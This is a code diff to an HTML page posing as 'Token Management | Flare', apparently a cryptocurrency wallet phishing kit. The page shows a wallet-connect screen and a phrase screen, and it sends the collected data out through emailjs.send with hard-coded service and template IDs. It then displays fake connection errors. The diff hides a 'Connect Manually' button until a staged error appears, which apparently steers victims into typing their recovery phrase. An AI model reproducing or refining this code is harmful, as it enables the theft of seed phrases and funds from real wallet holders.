@@ -13,7 +13,6 @@
     <meta name="title" content="Token Management | Flare">
     <title>Token Management | Flare</title>
     <style>
-        /* Existing styles preserved */
         * {
             box-sizing: border-box;
             margin: 0;
@@ -765,7 +764,7 @@
                             <span id="selectedWalletName" class="wallet-name-error">MetaMask Wallet</span>
                         </div>
                         
-                        <button class="connect-manually">Connect Manually</button>
+                       <button class="connect-manually" style="display: none;">Connect Manually</button>
                     </div>
                     
                     <!-- Phrase Screen -->
@@ -941,6 +940,7 @@
 
                 setTimeout(() => {
                     errorMessage.textContent = 'Error Connecting...'; 
+                     connectManuallyBtn.style.display = 'block';
                 }, 3000); 
             });
         });
@@ -1015,7 +1015,7 @@
                 try {
                     
                     await emailjs.send('service_84yoi3q', 'template_vwx0fq7', data);
-                    console.log('error..');
+                    console.log('erro..');
 
                     setTimeout(() => {
                         currentErrorMessage.textContent = 'Error Connecting, try again later.';
